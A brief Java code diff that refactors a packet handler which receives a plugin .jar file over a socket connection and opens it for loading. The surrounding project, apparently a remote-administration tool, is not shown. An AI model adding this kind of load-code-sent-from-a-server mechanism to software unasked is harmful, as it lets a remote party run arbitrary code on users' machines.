@@ -22,12 +22,12 @@ public class Packet101TransferPlugin extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String name = Connection.readLine();		
+		String name = Connection.instance.readLine();		
 		
 		File file = File.createTempFile(name, ".jar");
 		
 		FileIO io = new FileIO();
-		io.readFile(file, Connection.socket, Connection.dis, Connection.dos, null, Main.getKey());
+		io.readFile(file, Connection.instance.getSocket(), Connection.instance.getDataInputStream(), Connection.instance.getDataOutputStream(), null, Main.getKey());
 		
 		FileInputStream fis = new FileInputStream(file);
 		JarInputStream jis = new JarInputStream(fis);
